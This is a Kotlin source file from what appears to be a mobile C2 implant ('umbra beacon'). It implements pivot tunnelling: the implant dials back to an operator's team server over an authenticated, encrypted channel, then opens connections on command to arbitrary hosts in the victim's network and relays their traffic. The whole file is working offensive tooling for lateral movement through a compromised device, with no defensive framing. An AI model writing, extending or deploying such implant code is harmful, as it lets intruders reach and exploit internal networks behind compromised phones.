package io.umbra.beacon

import java.io.BufferedInputStream
import java.io.InputStream
import java.io.OutputStream
import java.net.InetSocketAddress
import java.net.Socket
import java.util.concurrent.ConcurrentHashMap

/**
 * Pivot callback sessions.
 *
 * The team server cannot reach into the network the phone sits in, so the
 * implant dials back: the server asks for a session with a `tunnel` task, the
 * implant opens a second connection to the server and announces the session
 * id in the HELLO metadata. Over that connection the server multiplexes
 * logical streams:
 *
 * ```
 * server -> agent   TUNNEL_OPEN  {stream, op:"open",   host, port}
 * agent  -> server  TUNNEL_OPEN  {stream, op:"result", ok, err}
 * both              TUNNEL_DATA  {stream, data}
 * both              TUNNEL_CLOSE {stream, reason}
 * ```
 *
 * One callback carries many streams, so a single extra connection is enough
 * for the whole pivot.
 */
object Tunnel {
    /** The payload size of one TUNNEL_DATA frame. */
    const val CHUNK = 32 * 1024

    /** How long the implant waits for the target to accept. */
    private const val CONNECT_TIMEOUT = 15000

    /** One live stream: a socket to the target. */
    private class Stream(val id: String, val socket: Socket) {
        val out: OutputStream = socket.getOutputStream()

        @Volatile
        var closed = false

        fun close() {
            closed = true
            try {
                socket.close()
            } catch (_: Throwable) {
            }
        }
    }

    /**
     * Open a callback session and serve pivot streams until the link fails.
     *
     * The function blocks; the caller runs it on its own thread.
     */
    fun openCallback(
        host: String,
        port: Int,
        psk: ByteArray,
        agentId: String,
        streamId: String,
        version: String,
        log: (String) -> Unit,
    ) {
        val socket = Socket()
        socket.connect(InetSocketAddress(host, port), CONNECT_TIMEOUT)
        socket.tcpNoDelay = true
        val input = BufferedInputStream(socket.getInputStream())
        val output = socket.getOutputStream()

        val suite = Wire.SUITE_AES256_GCM
        val ephemeral = Crypto.x25519Keypair()
        val clientNonce = Crypto.random(16)
        val ts = System.currentTimeMillis() / 1000
        val auth = Crypto.helloAuth(
            psk, Crypto.ROLE_AGENT, agentId.toByteArray(),
            ephemeral.publicRaw, clientNonce, ts, suite,
        )
        val meta = SysInfo.meta(version)
        // The tunnel session id travels in the metadata: the server routes
        // the connection to the pivot broker with it.
        meta.entries["tunnel"] = Upk.str(streamId)
        val hello = Upk.map(
            "v" to Upk.num(1),
            "role" to Upk.num(Crypto.ROLE_AGENT.toLong()),
            "id" to Upk.str(agentId),
            "pub" to Upk.bin(ephemeral.publicRaw),
            "cn" to Upk.bin(clientNonce),
            "ts" to Upk.num(ts),
            "suite" to Upk.num(suite.toLong()),
            "auth" to Upk.bin(auth),
            "meta" to meta,
        )
        val boot = Session.fromBootstrap(psk, suite, isServer = false)
        Wire.writeFrame(output, boot.sealValue(Wire.MSG_HELLO, hello))

        val (msgType, ack) = boot.openValue(Wire.readFrame(input))
        if (msgType != Wire.MSG_HELLO_ACK) throw SessionException("expected HELLO_ACK")
        val serverPub = ack.field("pub")?.bytes() ?: throw SessionException("missing server key")
        val serverNonce = ack.field("sn")?.bytes() ?: throw SessionException("missing nonce")
        val sid = ack.field("sid")?.bytes() ?: throw SessionException("missing session id")
        val negSuite = ack.field("suite")?.long()?.toInt() ?: 0
        if (serverPub.size != 32 || serverNonce.size != 16 || sid.size != 16) {
            throw SessionException("malformed HELLO_ACK")
        }
        val want = Crypto.ackAuth(
            psk, agentId.toByteArray(), ephemeral.publicRaw,
            serverPub, clientNonce, serverNonce, sid, negSuite,
        )
        if (!Crypto.ctEq(want, ack.field("auth")?.bytes())) {
            throw SessionException("server authentication failed (wrong PSK?)")
        }
        val shared = Crypto.x25519Shared(ephemeral.privateKey, serverPub)
        val (prk, km) = Crypto.deriveSession(shared, clientNonce, serverNonce)
        val session = Session(negSuite, isServer = false, bootstrap = false, material = km, prk = prk)

        val writeLock = Any()
        fun send(type: Byte, value: Upk) {
            // One critical section: the session nonce must not repeat and the
            // frames must leave in order.
            synchronized(writeLock) {
                Wire.writeFrame(output, session.sealValue(type, value))
            }
        }

        send(
            Wire.MSG_TUNNEL_OPEN,
            Upk.map("stream" to Upk.str(streamId), "op" to Upk.str("ready")),
        )
        log("tunnel callback open ($streamId)")

        val streams = ConcurrentHashMap<String, Stream>()
        try {
            while (true) {
                val frame = Wire.readFrame(input)
                val (type, body) = session.openValue(frame)
                when (type) {
                    Wire.MSG_TUNNEL_OPEN -> {
                        val op = body.field("op")?.text() ?: ""
                        val id = body.field("stream")?.text() ?: ""
                        if (op == "open" && id.isNotEmpty()) {
                            val target = body.field("host")?.text() ?: ""
                            val port = body.field("port")?.long()?.toInt() ?: 0
                            val t = Thread({
                                serveStream(id, target, port, streams, ::send, log)
                            }, "umbra-tunnel-$id")
                            t.isDaemon = true
                            t.start()
                        }
                    }
                    Wire.MSG_TUNNEL_DATA -> {
                        val id = body.field("stream")?.text() ?: ""
                        val data = body.field("data")?.bytes() ?: ByteArray(0)
                        val stream = streams[id]
                        if (stream != null && !stream.closed) {
                            try {
                                synchronized(stream) {
                                    stream.out.write(data)
                                    stream.out.flush()
                                }
                            } catch (t: Throwable) {
                                stream.close()
                            }
                        }
                    }
                    Wire.MSG_TUNNEL_CLOSE -> {
                        val id = body.field("stream")?.text() ?: ""
                        streams.remove(id)?.close()
                    }
                    Wire.MSG_PADDING -> {
                        // Padding frames carry nothing.
                    }
                    else -> {
                        log("unexpected frame on the tunnel: ${type.toInt()}")
                    }
                }
            }
        } finally {
            streams.values.forEach { it.close() }
            streams.clear()
            try {
                socket.close()
            } catch (_: Throwable) {
            }
        }
    }

    /**
     * Connect to the target the server asked for and relay it.
     *
     * The result frame tells the server whether the connection worked; the
     * server only starts to relay once it saw the answer.
     */
    private fun serveStream(
        id: String,
        host: String,
        port: Int,
        streams: ConcurrentHashMap<String, Stream>,
        send: (Byte, Upk) -> Unit,
        log: (String) -> Unit,
    ) {
        if (host.isEmpty() || port <= 0) {
            send(
                Wire.MSG_TUNNEL_OPEN,
                Upk.map(
                    "stream" to Upk.str(id),
                    "op" to Upk.str("result"),
                    "ok" to Upk.bool(false),
                    "err" to Upk.str("the server asked for an invalid target"),
                ),
            )
            return
        }
        val target = try {
            Socket().apply {
                connect(InetSocketAddress(host, port), CONNECT_TIMEOUT)
                soTimeout = 60000
                tcpNoDelay = true
            }
        } catch (t: Throwable) {
            send(
                Wire.MSG_TUNNEL_OPEN,
                Upk.map(
                    "stream" to Upk.str(id),
                    "op" to Upk.str("result"),
                    "ok" to Upk.bool(false),
                    "err" to Upk.str("connect $host:$port failed: ${t.message}"),
                ),
            )
            return
        }
        val stream = Stream(id, target)
        streams[id] = stream
        send(
            Wire.MSG_TUNNEL_OPEN,
            Upk.map(
                "stream" to Upk.str(id),
                "op" to Upk.str("result"),
                "ok" to Upk.bool(true),
            ),
        )
        log("tunnel stream $id -> $host:$port")

        // Target -> server.
        val up = Thread({
            try {
                val buf = ByteArray(CHUNK)
                while (true) {
                    val n = target.getInputStream().read(buf)
                    if (n < 0) break
                    send(
                        Wire.MSG_TUNNEL_DATA,
                        Upk.map("stream" to Upk.str(id), "data" to Upk.bin(buf.copyOf(n))),
                    )
                }
            } catch (_: Throwable) {
            } finally {
                streams.remove(id)
                stream.close()
                send(
                    Wire.MSG_TUNNEL_CLOSE,
                    Upk.map("stream" to Upk.str(id), "reason" to Upk.str("the target closed the connection")),
                )
            }
        }, "umbra-tunnel-up-$id")
        up.isDaemon = true
        up.start()
    }

    /** Read one frame from a stream; used by the tests. */
    internal fun readFrame(input: InputStream): ByteArray = Wire.readFrame(input)
}
